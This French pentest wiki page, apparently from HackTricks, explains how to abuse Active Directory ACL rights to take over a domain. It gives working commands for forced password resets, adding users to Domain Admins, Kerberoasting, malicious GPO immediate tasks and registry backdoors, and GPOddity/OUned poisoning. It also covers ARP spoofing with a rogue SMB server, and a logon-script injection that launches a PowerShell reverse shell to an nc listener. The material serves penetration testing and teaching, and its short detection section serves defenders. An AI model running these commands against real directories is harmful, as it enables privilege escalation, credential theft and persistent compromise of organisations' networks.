# Abus des ACL/ACE d’Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques présentées dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Droits GenericAll sur un utilisateur**

Ce privilège donne à un attaquant le contrôle total d’un compte utilisateur ciblé. Une fois les droits `GenericAll` confirmés à l’aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de l’utilisateur ciblé** : avec `net user <username> <password> /domain`, l’attaquant peut réinitialiser le mot de passe de l’utilisateur.
- Depuis Linux, vous pouvez faire de même via SAMR avec `net rpc` de Samba :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Si le compte est désactivé, effacez l’indicateur UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer l’indicateur `ACCOUNTDISABLE` :<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting** : Attribuez un SPN au compte de l’utilisateur pour le rendre kerberoastable, puis utilisez Rubeus et targetedKerberoast.py pour extraire les hashes du ticket-granting ticket (TGT) et tenter de les cracker.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **ASREPRoasting ciblé** : Désactivez la pré-authentification pour l’utilisateur, rendant son compte vulnérable à ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link** : Avec `GenericAll` sur un utilisateur, vous pouvez ajouter un identifiant basé sur un certificat et vous authentifier en tant que cet utilisateur sans modifier son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances à des groupes s’il dispose des droits `GenericAll` sur un groupe tel que `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l’attaquant peut :

- **S’ajouter au groupe Domain Admins** : cela peut se faire avec des commandes directes ou à l’aide de modules comme Active Directory ou PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires si vous disposez des droits GenericAll/Write sur leur appartenance. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM aux hôtes qui tiennent compte de ce groupe :<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write sur un ordinateur/un utilisateur**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : prendre le contrôle d’un objet ordinateur.
- **Shadow Credentials** : utiliser cette technique pour usurper l’identité d’un compte ordinateur ou utilisateur en exploitant ces privilèges afin de créer des shadow credentials.

## **WriteProperty sur un groupe**

Si un utilisateur dispose de droits `WriteProperty` sur tous les objets d’un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (auto-appartenance) à un groupe**

Ce privilège permet aux attaquants de s’ajouter à des groupes spécifiques, tels que `Domain Admins`, à l’aide de commandes qui modifient directement l’appartenance aux groupes. La séquence de commandes suivante permet de s’ajouter soi-même :

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Privilège similaire, il permet aux attaquants de s’ajouter directement à des groupes en modifiant leurs propriétés s’ils disposent du droit `WriteProperty` sur ces groupes. La vérification et l’exploitation de ce privilège s’effectuent avec :

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Détenir le droit `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser son mot de passe sans connaître son mot de passe actuel. La vérification de ce droit et son exploitation peuvent se faire avec PowerShell ou d’autres outils en ligne de commande. Plusieurs méthodes permettent de réinitialiser le mot de passe d’un utilisateur, notamment via des sessions interactives et des one-liners pour les environnements non interactifs. Les commandes vont de simples invocations PowerShell à l’utilisation de `rpcclient` sous Linux, illustrant la diversité des vecteurs d’attaque.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner sur un groupe**

Si un attaquant découvre qu’il dispose des droits `WriteOwner` sur un groupe, il peut s’en attribuer la propriété. Cela a un impact particulièrement important lorsque le groupe concerné est `Domain Admins`, car en devenir propriétaire permet d’exercer un contrôle plus étendu sur les attributs et les membres du groupe. Le processus consiste à identifier le bon objet avec `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier son propriétaire, en indiquant son SID ou son nom.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite sur un utilisateur**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut modifier le chemin du script d’ouverture de session d’un utilisateur afin d’exécuter un script malveillant lors de sa connexion. Pour cela, il utilise la commande `Set-ADObject` afin de modifier la propriété `scriptpath` de l’utilisateur cible et de la faire pointer vers le script de l’attaquant.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Un ACE `WriteProperty` plus restreint, limité à l'attribut [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) de l'utilisateur, peut suffire ; `GenericWrite` n'est pas nécessaire. Associez ce droit sur l'attribut à un script modifiable dans l'arborescence `SYSVOL\<domain>\scripts` ou `NETLOGON` du domaine, puis évaluez si l'utilisateur ciblé est susceptible de se connecter et d'exécuter le script. Le script s'exécute dans le contexte de cet utilisateur lors de sa connexion. Examinez séparément les ACL AD effectives et les ACL des fichiers/partages ; la présence d'un ACE Allow correspondant ou d'un répertoire modifiable ne suffit pas à établir que le chemin complet est exploitable.

## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance à un groupe, par exemple en s'y ajoutant eux-mêmes ou en y ajoutant d'autres utilisateurs. Ce processus consiste à créer un objet d'identification, à l'utiliser pour ajouter ou supprimer des utilisateurs d'un groupe, puis à vérifier les changements d'appartenance à l'aide de commandes PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Depuis Linux, Samba `net` peut ajouter ou supprimer des membres lorsque vous détenez `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer de privilèges `WriteDACL` sur celui-ci permet à un attaquant de s’accorder des privilèges `GenericAll` sur l’objet. Pour ce faire, il manipule ADSI, ce qui lui donne le contrôle total de l’objet et la possibilité de modifier ses appartenances à des groupes. Malgré cela, l’exploitation de ces privilèges présente des limitations avec les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Prise de contrôle rapide avec WriteDACL/WriteOwner (PowerView)

Lorsque vous disposez des droits `WriteOwner` et `WriteDacl` sur un utilisateur ou un compte de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe à l’aide de PowerView sans connaître l’ancien mot de passe :

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes :
- Vous devrez peut-être d’abord vous attribuer la propriété si vous n’avez que `WriteOwner` :

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validez l’accès avec n’importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Réplication sur le domaine (DCSync)**

L’attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour se faire passer pour un Domain Controller et synchroniser des données, notamment les identifiants des utilisateurs. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, qui permettent aux attaquants d’extraire des informations sensibles de l’environnement AD sans accéder directement à un Domain Controller.<sup>[[5]](#references)</sup> [**En savoir plus sur l’attaque DCSync ici.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

L’accès délégué à la gestion des Group Policy Objects (GPO) peut présenter des risques importants pour la sécurité. Par exemple, si un utilisateur tel que `offense\spotless` dispose de droits délégués de gestion des GPO, il peut avoir des privilèges comme **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces permissions peuvent être exploitées à des fins malveillantes, comme le montre PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Énumérer les permissions GPO

Pour identifier les GPO mal configurées, les cmdlets de PowerSploit peuvent être enchaînées. Cela permet de découvrir les GPO qu’un utilisateur donné a le droit de gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs auxquels une stratégie donnée est appliquée** : Il est possible de déterminer à quels ordinateurs une GPO donnée s’applique afin de comprendre l’ampleur de son impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Stratégies appliquées à un ordinateur donné** : Pour voir quelles stratégies s’appliquent à un ordinateur donné, des commandes comme `Get-DomainGPO` peuvent être utilisées.

**OU auxquelles une stratégie donnée est appliquée** : Les unités organisationnelles (OU) concernées par une stratégie donnée peuvent être identifiées avec `Get-DomainOU`.

Vous pouvez également utiliser l’outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y détecter des problèmes.

### Exploiter une GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela permet d’ajouter un utilisateur au groupe des administrateurs locaux sur les machines concernées, ce qui élève considérablement ses privilèges :

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Module GroupPolicy - Abus de GPO

Le module GroupPolicy, s’il est installé, permet de créer et de lier de nouveaux GPO, ainsi que de définir des préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs affectés. Cette méthode nécessite la mise à jour du GPO et la connexion d’un utilisateur à l’ordinateur pour déclencher l’exécution :

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abus de GPO

SharpGPOAbuse permet d’abuser des GPO existantes en y ajoutant des tâches ou en modifiant des paramètres, sans avoir à créer de nouvelles GPO. Cet outil nécessite de modifier des GPO existantes ou d’utiliser les outils RSAT pour en créer de nouvelles avant d’appliquer les changements :

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forcer la mise à jour des stratégies

Les mises à jour des GPO ont généralement lieu toutes les 90 minutes environ. Pour accélérer le processus, notamment après avoir apporté une modification, la commande `gpupdate /force` peut être exécutée sur l’ordinateur cible afin de forcer une mise à jour immédiate des stratégies. Cette commande garantit que les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### En coulisses

L’inspection des tâches planifiées d’une GPO donnée, comme `Misconfigured Policy`, permet de confirmer l’ajout de tâches telles que `evilTask`. Ces tâches sont créées à l’aide de scripts ou d’outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, telle qu’elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les détails de la tâche planifiée, notamment la commande à exécuter et ses déclencheurs. Ce fichier illustre la manière dont les tâches planifiées sont définies et gérées dans les GPO, et permet d’exécuter des commandes ou des scripts arbitraires dans le cadre de l’application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de modifier les appartenances aux groupes et aux utilisateurs sur les systèmes cibles. En modifiant directement les fichiers de stratégie Utilisateurs et groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. Cela est possible grâce à la délégation des autorisations de gestion des GPO, qui permet de modifier les fichiers de stratégie pour y ajouter de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Utilisateurs et groupes décrit la mise en œuvre de ces changements. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent obtenir des privilèges élevés sur les systèmes concernés. Cette méthode permet une élévation directe des privilèges par la manipulation des GPO.

Pour les paramètres de sécurité tels que l’appartenance aux groupes locaux et les droits des utilisateurs, inspectez également le modèle GPO appliqué à `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` ainsi que l’ACL du répertoire `SecEdit`. Un répertoire ou un fichier accessible en écriture constitue une piste à examiner : l’accès effectif au partage SYSVOL, les refus et les ACL héritées, les autorisations du conteneur Group Policy, la portée de la stratégie et l’actualisation côté client déterminent toujours si une modification peut prendre effet. L’appartenance à un groupe nommé « GPO Managers » ne confère pas à elle seule des droits de modification. [Microsoft documente ce chemin de modèle et la distinction entre le conteneur Group Policy et le modèle.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

En outre, d’autres méthodes d’exécution de code ou de maintien de la persistance peuvent être envisagées, par exemple l’utilisation de scripts d’ouverture et de fermeture de session, la modification de clés de registre pour les exécutions automatiques, l’installation de logiciels via des fichiers .msi ou la modification de configurations de services. Ces techniques offrent diverses possibilités de conserver l’accès et de contrôler les systèmes cibles en abusant des GPO.

### Redirection de la récupération GPC/GPT vers des services malveillants authentifiés

Une GPO se compose d’un **Group Policy Container (GPC)** LDAP contenant des métadonnées et d’un **Group Policy Template (GPT)** hébergé sur SMB et contenant les fichiers de stratégie. Lors de l’actualisation, le client suit le `gPLink` du conteneur, lit le GPC référencé et son `gPCFileSysPath`, puis télécharge le GPT à partir de ce chemin UNC. Par conséquent, un accès en écriture au GPC lui-même ou au `gPLink` d’une OU, d’un Site ou d’un Domain peut permettre de déclencher le traitement de stratégies avec des privilèges élevés.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Empoisonnement de `gPCFileSysPath` avec GPOddity

Si le principal contrôlé peut modifier le GPC cible (directement ou via un **NTLM relay to LDAP**), remplacez `gPCFileSysPath` par un chemin UNC hébergé par l’attaquant. [GPOddity](https://github.com/synacktiv/GPOddity) automatise la modification LDAP et héberge un GPT malveillant contenant des fichiers de stratégie basés sur des modules ou une tâche immédiate que le client Group Policy exécute en tant que `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Un partage SMB anonyme ou ne nécessitant pas d’identifiants ne suffit pas sur les clients Windows actuels : SMB Secure Negotiate exige une preuve que l’authentification a réussi. Le service malveillant doit donc valider l’identité de domaine, dériver la clé de session SMB et signer correctement ses réponses. En mode intégré, configurez GPOddity avec un compte machine contrôlé et sa clé de service, puis choisissez un payload côté ordinateur ou côté utilisateur dans la section `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Cas particulier de GPO :** après MS16-072, Windows crée toujours deux sessions SMB2 dans la **même connexion TCP** : la session utilisateur lit `GPT.INI`, puis la session du compte ordinateur lit la configuration effective, par exemple `ScheduledTasks.xml`. Un serveur malveillant doit donc indexer l’état d’authentification, les clés de session et les clés de signature par `SessionId` SMB2, et non uniquement par socket. Le fork Scapy intégré à GPOddity/OUned implémente cela via `SMBStreamSocketMultiplexing` et un `SMBServer` compatible avec le multiplexage ; les serveurs Impacket/Scapy mono-session réutilisent sinon le mauvais état de signature et échouent avec les stratégies utilisateur.<sup>[[15]](#references)</sup>

#### Empoisonnement de `gPLink` avec OUned

Avec `WriteGPLink`, `GenericWrite` ou un contrôle équivalent sur une OU, un site ou un domaine, un attaquant peut ajouter un lien dont le DN GPC est servi par un hôte LDAP contrôlé par l’attaquant. Cette primitive a été présentée à l’origine par Petros Koutroumpis ; [OUned](https://github.com/synacktiv/OUned) automatise l’écriture LDAP et la chaîne GPC/GPT malveillante.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

La victime s’authentifie d’abord auprès du service LDAP frauduleux et reçoit un GPC dont le `gPCFileSysPath` pointe vers le service SMB frauduleux ; elle s’authentifie ensuite auprès de SMB et applique le GPT fourni. OUned a donc besoin d’un compte avec un SPN LDAP, d’un compte machine avec un SPN HOST pour SMB (le même compte machine peut remplir les deux conditions) et d’une résolution DNS ou d’une redirection inverse qui achemine les ports 389 et 445 vers l’hôte de l’opérateur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Le serveur LDAP Scapy intégré d’OUned valide Kerberos/SPNEGO avec la véritable clé de service contrôlée et sert des données GPC arbitraires à partir de JSON. La clé JSON vide représente rootDSE, les préfixes `base64:` indiquent des valeurs binaires, et le serveur prend en charge les opérations add/delete/modify/search ainsi que les recherches `BASE`, `LEVEL` et `SUBTREE` ; il peut négocier l’absence de protection, l’intégrité ou la confidentialité. Le service est ainsi réutilisable lorsqu’un autre composant Windows suit une référence LDAP contrôlée par un attaquant, mais exige une authentification LDAP.<sup>[[15]](#references)</sup>

Ne partez pas du principe que synchroniser le mot de passe d’un compte dans un domaine factice reproduit toutes les clés Kerberos : RC4 est dérivé du mot de passe, tandis que la dérivation de clé AES utilise également un salt dérivé du nom d’hôte/domaine du principal. Fournir la véritable clé AES du compte à `KerberosSSP` évite de forcer RC4 en modifiant de manière détectable l’attribut `msDS-SupportedEncryptionTypes`, modifiable par le compte machine lui-même.<sup>[[15]](#references)</sup>

#### Pistes de détection

Corrélez les changements de `gPCFileSysPath` ou `gPLink` avec les changements de version des GPO et les nouveaux fichiers XML de tâches immédiates/planifiées. Examinez les liens vers des contextes de nommage inattendus, les hôtes UNC en dehors de l’ensemble approuvé de DC/SYSVOL, les enregistrements DNS redirigeant les noms de comptes machine, les tickets de service LDAP/CIFS pour des comptes machine inhabituels, ainsi que les changements de `msDS-SupportedEncryptionTypes` qui activent RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sur une OU/un domaine permet de modifier l’attribut `gPLink` du conteneur cible et de **forcer l’application d’une GPO existante** sans modifier la GPO elle-même. Cela devient intéressant lorsque la GPO liée référence déjà du contenu distant via des **chemins UNC** (`\\HOST\share\...`), car les utilisateurs authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.<sup>[[11]](#references)</sup>

Workflow général :

1. Utilisez BloodHound pour identifier un principal disposant de `WriteGPLink` sur une OU, puis énumérez les ordinateurs/utilisateurs de cette OU.
2. Clonez `SYSVOL` en lecture seule et analysez les GPO à la recherche d’éléments **Software Installation**, de **mappages de lecteurs** (`Drives.xml`) et de **scripts d’ouverture de session/de démarrage** qui référencent des chemins UNC.
3. Privilégiez les stratégies pointant vers un **nom d’hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/d’espace de noms de domaine, car les chemins basés sur un nom d’hôte sont plus faciles à rediriger par spoofing L2.
4. Ajoutez le GUID de la GPO choisie à `gPLink` de l’OU cible afin que la victime traite cette stratégie existante.
5. Sur le même domaine de diffusion, effectuez un spoofing ARP de l’hôte UNC et associez localement son adresse IP (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre hôte.
6. Servez le chemin/nom de fichier attendu depuis un serveur SMB contrôlé par l’attaquant (par exemple `smbserver.py`) et attendez le traitement normal des stratégies.

Exemple de collecte de `SYSVOL` et de corrélation des GPO :

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Liez le GPO existant à l’OU cible :

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Si la GPO liée déploie un MSI depuis un chemin UNC, le client le récupérera au **démarrage de l’ordinateur** et l’installera en tant que **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en hébergeant un MSI malveillant au **même partage/chemin/nom**, vous pouvez transformer `WriteGPLink` en exécution de code SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing est important** : le nouveau lien est détecté lors de l’actualisation des stratégies (généralement toutes les ~90 minutes), mais **Software Installation** se déclenche généralement au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter le rejet par l’installateur, modifiez le MSI malveillant afin que son **`ProductCode`** et son **`PackageCode`** correspondent à ceux du package légitime attendu par la GPO.
- D’anciens fichiers d’annonce `.aas` peuvent rester dans `SYSVOL` ; vérifiez donc que le déploiement semble toujours actif avant de vous y fier.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Détournement UNC du mappage de lecteur -> capture NTLM / relay WebDAV

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s’authentifier auprès du chemin UNC configuré à l’ouverture de session ou lors d’une reconnexion. Si vous usurpez l’hôte référencé, vous pouvez capturer **NetNTLMv2**. Si SMB est volontairement mis en échec, Windows peut réessayer via **WebDAV** et envoyer **NTLM over HTTP**, une méthode bien plus souple pour les relais vers **LDAP(S)**, **AD CS** ou **SMB**.

#### Détournement UNC de scripts d’ouverture de session/de démarrage

Le même principe s’applique aux scripts hébergés sur UNC et découverts dans `SYSVOL` :

- Les **scripts d’ouverture de session** s’exécutent généralement dans le contexte de l’**utilisateur**.
- Les **scripts de démarrage** s’exécutent généralement dans le contexte de l’**ordinateur / SYSTEM**.

Si le chemin du script pointe vers un nom d’hôte usurpable, redirigez l’hôte UNC et servez le contenu de remplacement du script depuis l’emplacement attendu.

## Empoisonnement des scripts d’ouverture de session SYSVOL/NETLOGON

Les chemins accessibles en écriture sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de modifier les scripts d’ouverture de session exécutés à la connexion des utilisateurs via GPO. Cela permet l’exécution de code dans le contexte de sécurité des utilisateurs qui se connectent.

### Localiser les scripts d’ouverture de session
- Inspectez les attributs utilisateur pour repérer un script d’ouverture de session configuré :

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Parcourir les partages de domaine pour repérer des raccourcis ou des références à des scripts :

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analyser les fichiers `.lnk` pour identifier les cibles situées dans SYSVOL/NETLOGON (astuce utile en DFIR et pour les attaquants sans accès direct aux GPO) :

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound affiche l’attribut de script d’ouverture de session `scriptPath` de l’objet utilisateur lorsqu’il est défini. Les scripts d’ouverture de session configurés par GPO sont une référence de stratégie distincte : inspectez donc également la GPO applicable.

### Valider les droits d’écriture (ne vous fiez pas aux listes des partages)
Les outils automatisés peuvent indiquer que SYSVOL/NETLOGON est en lecture seule, même si l’ACL NTFS du script concerné est différente. Commencez par inspecter ce fichier et son répertoire parent en lecture seule ; les entrées ACE Allow correspondantes restent des pistes, car les droits d’accès SMB et NTFS effectifs, les entrées ACE Deny et le jeton actuel entrent tous en jeu :

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Un test d’écriture autorisé doit être ciblé et réversible, avec une sauvegarde du script d’origine qui sera restaurée. Ne remplacez pas un script de connexion fonctionnel simplement pour tester l’accès : une écriture réussie peut s’exécuter à la prochaine connexion d’un utilisateur.

### Empoisonner un script de connexion VBScript pour obtenir une RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le sur revshells.com) et conservez la logique d’origine pour éviter de perturber le fonctionnement de l’entreprise :

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Écoutez sur votre hôte et attendez la prochaine ouverture de session interactive :

```bash
rlwrap -cAr nc -lnvp 443
```

Notes :
- L’exécution s’effectue avec le token de l’utilisateur de journalisation (pas SYSTEM). La portée correspond au lien GPO (OU, site, domaine) qui applique ce script.
- Après utilisation, restaurez le contenu et les horodatages d’origine.

## References

